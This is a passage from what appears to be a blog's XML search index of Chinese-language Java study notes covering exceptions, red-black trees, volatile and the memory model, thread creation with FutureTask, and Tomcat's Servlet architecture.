srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211175233385"></p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><h2 id="sleep-和wait-方法区别"><a href="#sleep-和wait-方法区别" class="headerlink" title="sleep( )和wait( )方法区别"></a>sleep( )和wait( )方法区别</h2><p>主要区别：sleep()方法没有释放锁，而wait()方法释放锁</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-异常Exception</title>
      <link href="/2021/12/09/Java/Java-%E5%BC%82%E5%B8%B8Exception/"/>
      <url>/2021/12/09/Java/Java-%E5%BC%82%E5%B8%B8Exception/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/12/09/Java/Java-%E5%BC%82%E5%B8%B8Exception/image-20211209163027463.png" class="lazyload" data-srcset="/2021/12/09/Java/Java-%E5%BC%82%E5%B8%B8Exception/image-20211209163027463.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211209163027463"></p><p>Java 异常分为两种：</p><p><strong>受检异常：</strong>除了 RuntimeException 及其子类以外，其他的 Exception 类及其子类都属于这种异常。<br><strong>非受检异常：</strong>包括 RuntimeException 及其子类和 Error</p><p><strong>受检异常则是编译器要求必须处置的异常,也就是除了非运行时异常，其他异常必须进行处理</strong></p><p>Exception 这类异常分为运行时异常和<strong>非运行时异常（编译异常）</strong>：</p><p>运行时异常 ：包括 RuntimeException 及其子类。比如 NullPointerException、IndexOutOfBoundsException。属于非受检异常，可以进行捕捉处理，也可以不处理。<br>非运行时异常（编译异常）：RuntimeExcaption 以外的 Exception。IOException、SQLException 已经自定义的异常，必须要进行处理。</p><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>平衡二叉查找树与红黑树</title>
      <link href="/2021/12/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91%E4%B8%8E%E7%BA%A2%E9%BB%91%E6%A0%91/"/>
      <url>/2021/12/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91%E4%B8%8E%E7%BA%A2%E9%BB%91%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>平衡二叉查找树的定义：二叉树中任意一个节点的左右子树的高度相差不能大于1.</p><p>红黑树是一种相对平衡的二叉查找树，不是严格意义上的平衡二叉查找树。</p><p>红黑树的节点一类被标记为黑色，一类被标记为红色；除此之外红黑树还需要满足一下四个要求：</p><ul><li>根节点是黑色的</li><li>每个叶子节点都是黑色<strong>的空节点</strong>，也就是叶子节点不存储数据</li><li>任何上下相邻的节点不能同时为红色，也就是红色节点被黑色节点隔开</li><li>对于每个节点，从该接地那到其叶子节点的所有路径，都包含相同数目的黑色节点</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-并发</title>
      <link href="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/"/>
      <url>/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="内存间的交互操作"><a href="#内存间的交互操作" class="headerlink" title="内存间的交互操作"></a>内存间的交互操作</h1><ul><li>lock和unlock</li><li>read和load：read作用于主内存的变量，把变量的值从主内存传输到线程的工作内存中；load作用于工作内存的变量，把read操作从主内存中得到的变量值放入工作内存的变量副本中（堆-&gt;寄存器-&gt;栈）</li><li>use：作用于工作内存的变量，把工作内存中的一个变量的值传给执行引擎(栈-&gt;寄存器)</li><li>assign：作用于工作内存的变量，把执行引擎接受的值赋给工作内存的变量（寄存器-&gt;栈）</li><li>store：作用于工作内存的变量，把工作内存中一个变量的值传到主内存中，一遍write使用（栈-&gt;堆）</li><li>write：作用于主内存，把store操作从工作内存中得到的变量值放在主内存变量中（栈-&gt;堆）</li></ul><h1 id="volatile变量"><a href="#volatile变量" class="headerlink" title="volatile变量"></a>volatile变量</h1><h4 id="两项特性"><a href="#两项特性" class="headerlink" title="两项特性"></a>两项特性</h4><ul><li><p><strong>第一项</strong>：保证次变量对所有线程的可见性；volatile变量在各个线程的工作内存中是不存在一致性的问题（从物理角度来看，各个呈现的工作内存中volatile变量也可以<strong>存在不一致情况</strong>，但由于每次使用之前都要先刷新，执行引擎看不到不一致的情况，因此可以认为存在不一致问题），但java里面的运算操作符并非原子操作，导致volatile变量的运算在并发下一样是不安全的。</p><p>在不符合两条规则的运算场景中，仍然要通过加锁来保证原子性：</p><ul><li>运算结果并不依赖当前变量的值（线程只写不读），或者能够确保只有单一的线程能修改变量的值</li><li>变量不需要与其他状态变量共同参与<strong>不变约束</strong></li></ul></li><li><p><strong>第二项</strong>：禁止指令重排序的优化，普通的变量仅会保证该方法执行过程中所有<strong>依赖赋值结果的地方都能获取到正确的结果</strong>，而不能保证复制操作的顺序与程序代码中执行顺序的一致。</p></li></ul><h2 id="双锁检测（Double-Check-Lock-DCL）单例"><a href="#双锁检测（Double-Check-Lock-DCL）单例" class="headerlink" title="双锁检测（Double Check Lock DCL）单例"></a><font color="red">双锁检测（Double Check Lock DCL）单例</font></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</span><br><span class="line">            Synchronized(Singlenton.class)&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    instance=<span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Singleton.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在new 对象线程里面可能会新建对象的过程中，需要将对象完全开辟出内存空间，指令顺序执行，就不会对其他线程的观测对象产生不可预知的错误。</p><p><img src="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/d5d312097e2b3de30ddd33426814454.jpg" class="lazyload" data-srcset="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/d5d312097e2b3de30ddd33426814454.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="d5d312097e2b3de30ddd33426814454"></p><p>指令重排序处理器必须能正确处理指令依赖情况来保证程序能都得出正确的运行结果；因此<code>lock addl $0x0,(%esp)</code>指令把修改同步到内存时，意味着所有之前操作都已经执行完毕，这样边形成了<strong>指令重排序无法越过内存屏障</strong>的效果。</p><p>线程T：对V变量：read/write(A)-&gt;use/assgin(F)-&gt;load/store(P)</p><p>​              对W变量：read/write(B)-&gt;use/assgin(G)-&gt;load/store(Q)</p><p>如果A先与B，那么P必先与Q，这条规则要求volatile修饰的变量不会被指令重排序优化，从而保证代码执行顺序与程序的顺序相同。</p><p><strong>时间先后顺序与先行先发生原则之间基本没有关系，衡量并发安全问题的时候不要受时间干扰，一切必须以先行先发生原则为准。</strong></p><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>一个进程在其执行的过程中可以产生多个线程。与进程不同的是同类的多个线程共享进程的<strong>堆</strong>和<strong>方法区</strong>资源，但每个线程有自己的<strong>程序计数器</strong>、<strong>虚拟机栈</strong>和<strong>本地方法栈</strong>，所以系统在产生一个线程，或是在各个线程之间作切换工作时，负担要比进程小得多，也正因为如此，线程也被称为轻量级进程。 </p><h1 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h1><p><img src="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/Java%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA%E5%9F%9FJDK1.8.37016205.png" class="lazyload" data-srcset="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/Java%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA%E5%9F%9FJDK1.8.37016205.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>线程私有的是<strong>虚拟机栈和本地方法栈</strong>，<strong>程序计数器</strong>主要是用来线程切换时记录该线程上次运行的位置，如果执行的是native方法，name程序计数器记录的是undefined地址，只有执行的是Java代码时程序计数器记录才是下一条指令的地址</p><p>程序计数器私有主要是为了<strong>线程切换后能恢复到正确的执行位置</strong>。</p><p>线程调度是指系统为线程分配处理器使用权的过程：<strong>协同式线程调度</strong>和<strong>抢占式线程调度（Java）</strong></p><h1 id="创建线程的多种方法"><a href="#创建线程的多种方法" class="headerlink" title="创建线程的多种方法"></a>创建线程的多种方法</h1><h2 id="使用lambok实例化一个线程"><a href="#使用lambok实例化一个线程" class="headerlink" title="使用lambok实例化一个线程"></a>使用lambok实例化一个线程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo03;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j; </span><br><span class="line"><span class="meta">@Slf4j(topic = &quot;Test02&quot;)</span> <span class="comment">//使用日志topic</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用runnable&quot;</span>);</span><br><span class="line">        <span class="comment">// 任务对象</span></span><br><span class="line">        Runnable runnable=()-&gt;log.debug(<span class="string">&quot;t 测试run&quot;</span>);</span><br><span class="line">        Thread t=<span class="keyword">new</span> Thread(runnable);</span><br><span class="line">        t.setName(<span class="string">&quot;my new Thread&quot;</span>);</span><br><span class="line">        t.start();</span><br><span class="line">        log.debug(<span class="string">&quot;main 测试&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/image-20211205223357324.png" class="lazyload" data-srcset="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/image-20211205223357324.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211205223357324" style="zoom: 67%;"><ul><li>Runnable更容易与线程池等高级API相结合</li><li>使用Runnable更加灵活</li></ul><h2 id="FutureTask-配合-Task"><a href="#FutureTask-配合-Task" class="headerlink" title="FutureTask 配合 Task"></a>FutureTask 配合 Task</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.plaf.FontUIResource;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Future;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.FutureTask;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j(topic = &quot;FutureTask&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test03</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//使用FutureTask  里面传入的使用一个Callable对象 有返回值 区别于 Runnable</span></span><br><span class="line">        FutureTask&lt;String&gt; task=<span class="keyword">new</span> FutureTask&lt;&gt;(()-&gt;&#123;</span><br><span class="line"></span><br><span class="line">            log.debug(<span class="string">&quot;test FutureTask&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        FutureTask&lt;String&gt; task2=<span class="keyword">new</span> FutureTask&lt;&gt;(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;hello2&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">new</span> Thread(task,<span class="string">&quot;t1&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(task2,<span class="string">&quot;t2&quot;</span>).start();</span><br><span class="line">        String res=task.get();</span><br><span class="line">        String res2=task2.get();</span><br><span class="line">        log.debug(<span class="string">&quot;结果:&#123;&#125;,&#123;&#125;&quot;</span>,res,res2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的FutureTask是一个已经实例化过的对象，其中需要传入一个Callable有返回值的接口实例，这里Callable与Runnable一样都是一个抽象接口</p><p><code>task.get()</code>方法则是能等待Callable该方法执行完成获取其返回值</p><img src="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/image-20211205225837271.png" class="lazyload" data-srcset="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/image-20211205225837271.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211205225837271" style="zoom:80%;"><h1 id="线程上下文切换"><a href="#线程上下文切换" class="headerlink" title="线程上下文切换"></a>线程上下文切换</h1><ul><li>时间片用完</li><li>垃圾回收</li><li>更高优先级的线程运行</li><li>线程自己调用sleep、yield、wait、join、park、synchronized、lock等方法</li></ul><h1 id="线程中常用的方法"><a href="#线程中常用的方法" class="headerlink" title="线程中常用的方法"></a>线程中常用的方法</h1><p><img src="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/image-20211211155744254.png" class="lazyload" data-srcset="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/image-20211211155744254.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211155744254"></p><p><img src="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/image-20211211155846389.png" class="lazyload" data-srcset="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/image-20211211155846389.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211155846389"></p><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>在java程序中，每次运行至少启动两个线程，一个是main线程，一个是垃圾收集线程，因此每当使用java命令执行一个类的时候，实际上都会启动一个jvm，每一个jvm实际上就是操作系统中启动了一个进程。</p><h1 id="状态转换图"><a href="#状态转换图" class="headerlink" title="**状态转换图"></a>**状态转换图</h1><p><img src="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pob3U5MjA3ODYzMTI=,size_16,color_FFFFFF,t_70.png" class="lazyload" data-srcset="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pob3U5MjA3ODYzMTI=,size_16,color_FFFFFF,t_70.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p><img src="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/Java+%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E5%8F%98%E8%BF%81.png" class="lazyload" data-srcset="/2021/12/02/Java/Java-%E5%B9%B6%E5%8F%91/Java+%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E5%8F%98%E8%BF%81.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="Java 线程状态变迁 "></p><h1 id="线程间的通信"><a href="#线程间的通信" class="headerlink" title="线程间的通信"></a>线程间的通信</h1><ul><li><h3 id="共享内存（java采用的）"><a href="#共享内存（java采用的）" class="headerlink" title="共享内存（java采用的）"></a>共享内存（java采用的）</h3><p>线程之间共享程序的公共状态，线程之间通过写-读内存中的公共状态来隐式进行通信</p></li><li><h3 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h3><p>线程之间没有公共状态，线程之间必须通过明确的发送消息来显式进行通信。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat</title>
      <link href="/2021/12/02/%E4%B8%AD%E9%97%B4%E4%BB%B6/Tomcat/"/>
      <url>/2021/12/02/%E4%B8%AD%E9%97%B4%E4%BB%B6/Tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat与Servlet"><a href="#Tomcat与Servlet" class="headerlink" title="Tomcat与Servlet"></a>Tomcat与Servlet</h1><img src="https://static001.geekbang.org/resource/image/df/01/dfe304d3336f29d833b97f2cfe8d7801.jpg" class="lazyload" data-srcset="https://static001.geekbang.org/resource/image/df/01/dfe304d3336f29d833b97f2cfe8d7801.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img" style="zoom:50%;"><p><strong>tomact是http服务器与Servlet容器之和</strong></p><p>Servlet 容器用来加载和管理业务类。HTTP 服务器不直接跟业务类打交道，而是把请求交给 Servlet 容器去处理，Servlet 容器会将请求转发到具体的 Servlet，<strong>如果这个 Servlet 还没创建，就加载并实例化这个 Servlet，然后调用这个 Servlet 的接口方法。</strong>因此 Servlet 接口其实是 Servlet 容器跟具体业务类之间的接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Servlet接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function">ServletConfig <span class="title">getServletConfig</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res）<span class="keyword">throws</span> ServletException, IOException;</span></span></span><br><span class="line"><span class="params"><span class="function">    </span></span></span><br><span class="line"><span class="params"><span class="function">    String getServletInfo()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了解耦，http服务器不直接调用Servlet服务器，而是把请求交给 Servlet 容器来处理</p><h2 id="Tomcat工作流程"><a href="#Tomcat工作流程" class="headerlink" title="Tomcat工作流程"></a>Tomcat工作流程</h2><p>当客户请求某个资源时，HTTP 服务器会用一个 ServletRequest 对象把客户的请求信息封装起来，然后调用 Servlet 容器的 service 方法，Servlet 容器拿到请求后，根据请求的 <strong>URL 和 Servlet 的映射关系</strong>，找到相应的 Servlet，如果 Servlet 还没有被加载，就用反射机制创建这个 Servlet，并调用 Servlet 的 init 方法来完成初始化，接着调用 Servlet 的 service 方法来处理请求，把 ServletResponse 对象返回给 HTTP 服务器，HTTP 服务器会把响应发送给客户端。</p><img src="https://static001.geekbang.org/resource/image/b7/15/b70723c89b4ed0bccaf073c84e08e115.jpg" class="lazyload" data-srcset="https://static001.geekbang.org/resource/image/b7/15/b70723c89b4ed0bccaf073c84e08e115.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img" style="zoom:50%;"><h2 id="Servlet容器注册Servlet服务"><a href="#Servlet容器注册Servlet服务" class="headerlink" title="Servlet容器注册Servlet服务"></a>Servlet容器注册Servlet服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//web应用结构</span><br><span class="line"></span><br><span class="line">| -  MyWebApp</span><br><span class="line">      | -  WEB-INF/web.xml        -- 配置文件，用来配置Servlet等</span><br><span class="line">      | -  WEB-INF/lib/           -- 存放Web应用所需各种JAR包</span><br><span class="line">      | -  WEB-INF/classes/       -- 存放你的应用类，比如Servlet类</span><br><span class="line">      | -  META-INF/              -- 目录存放工程的一些信息</span><br></pre></td></tr></table></figure><p>Servlet 规范里定义了 ServletContext 这个接口来对应一个 Web 应用。Web 应用部署好后，Servlet 容器在启动时会加载 Web 应用，并为每个 Web 应用创建唯一的 ServletContext 对象。你可以把 ServletContext 看成是一个全局对象，一个 Web 应用可能有多个 Servlet，这些 Servlet 可以通过全局的 ServletContext 来共享数据，这些数据包括 Web 应用的初始化参数、Web 应用目录下的文件资源等。由于 ServletContext 持有所有 Servlet 实例，你还可以通过它来实现 Servlet 请求的转发。</p><h1 id="Tomcat核心功能"><a href="#Tomcat核心功能" class="headerlink" title="Tomcat核心功能"></a>Tomcat核心功能</h1><ul><li><p>处理 Socket 连接，负责网络字节流与 Request 和 Response 对象的转化。（连接器）</p></li><li><p>加载和管理 Servlet，以及具体处理 Request 请求。（容器）</p><p><strong>因此 Tomcat 设计了两个核心组件连接器（Connector）和容器（Container）来分别做这两件事情。连接器负责对外交流，容器负责内部处理。</strong></p></li></ul><h1 id="Tomcat支持的I-O-应用层协议"><a href="#Tomcat支持的I-O-应用层协议" class="headerlink" title="Tomcat支持的I/O 应用层协议"></a>Tomcat支持的I/O 应用层协议</h1><p>Tomcat 支持的 I/O 模型有：</p><ul><li>NIO：非阻塞 I/O，采用 Java NIO 类库实现。</li><li>NIO2：异步 I/O，采用 JDK 7 最新的 NIO2 类库实现。</li><li>APR：采用 Apache 可移植运行库实现，是 C/C++ 编写的本地库。</li></ul><p>Tomcat 支持的应用层协议有：</p><ul><li>HTTP/1.1：这是大部分 Web 应用采用的访问协议。</li><li>AJP：用于和 Web 服务器集成（如 Apache）。</li><li>HTTP/2：HTTP 2.0 大幅度的提升了 Web 性能。</li></ul><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-二分查找</title>
      <link href="/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
      <url>/2021/11/25/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
      
